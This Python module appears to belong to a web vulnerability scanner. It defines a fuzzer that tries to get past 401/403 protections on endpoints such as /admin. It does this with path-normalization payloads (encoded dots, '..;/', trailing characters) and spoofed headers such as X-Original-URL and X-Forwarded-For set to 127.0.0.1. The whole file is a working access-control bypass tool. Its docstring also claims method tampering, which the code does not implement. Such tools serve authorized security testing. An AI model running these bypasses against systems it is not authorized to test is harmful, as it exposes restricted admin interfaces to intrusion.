import requests
from rich.console import Console
from urllib.parse import urlparse

console = Console()

def check_403_bypass(url, headers=None):
    """
    Advanced 403/401 Bypass Fuzzer.
    Targets "Forbidden" or "Unauthorized" endpoints (like /admin) using:
    - Path Normalization (e.g., /%2e/admin, /admin/., //admin//)
    - HTTP Header Spoofing (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
    - Method tampering (POST -> GET, GET -> TRACE)
    """
    console.print(f"[bold cyan][*] Scanning for 403/401 Bypasses (Path Normalization & Spoofing): {url}[/bold cyan]")
    
    findings = []
    
    # We only want to run this if the original URL returns a 403 or 401
    try:
        orig_resp = requests.get(url, headers=headers, timeout=5)
        if orig_resp.status_code not in [401, 403]:
            console.print("[dim]- Target is not 403/401. Skipping bypass checks.[/dim]")
            return findings
    except requests.exceptions.RequestException:
        return findings

    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path if parsed.path != "" else "/"
    
    console.print(f"[dim]- Baseline is {orig_resp.status_code}. Attempting bypass techniques...[/dim]")

    # 1. Path Normalization Payloads
    path_payloads = [
        f"/%2e{path}", f"{path}/.", f"//.{path}//", f"{path}%20", f"{path}%09", 
        f"{path}?", f"{path}.json", f"{path}..;/", f"/anything/..;{path}", 
        f"{path}#", f"/*{path}/*"
    ]
    
    for pp in path_payloads:
        target_url = f"{base_url}{pp}"
        try:
            r = requests.get(target_url, headers=headers, timeout=5)
            # If we bypassed it and got a 200 OK (and it's not a generic 404 or redirect)
            if r.status_code in [200, 201] and len(r.text) > 100:
                console.print(f"[bold red][!] CRITICAL: 403 Bypass via Path Normalization: {target_url}[/bold red]")
                findings.append(f"403 Bypass (Path): {target_url}")
        except:
            pass

    # 2. Header Spoofing Payloads
    spoof_headers = [
        {"X-Original-URL": path},
        {"X-Rewrite-URL": path},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"}
    ]
    
    for spoof in spoof_headers:
        test_headers = headers.copy() if headers else {}
        test_headers.update(spoof)
        try:
            r = requests.get(url, headers=test_headers, timeout=5)
            if r.status_code in [200, 201] and len(r.text) > 100:
                header_name = list(spoof.keys())[0]
                console.print(f"[bold red][!] CRITICAL: 403 Bypass via Header Spoofing ({header_name}): {url}[/bold red]")
                findings.append(f"403 Bypass (Header): {header_name} at {url}")
        except:
            pass
            
    if not findings:
        console.print("[green][+] No 403/401 bypass vulnerabilities detected.[/green]")
        
    return findings
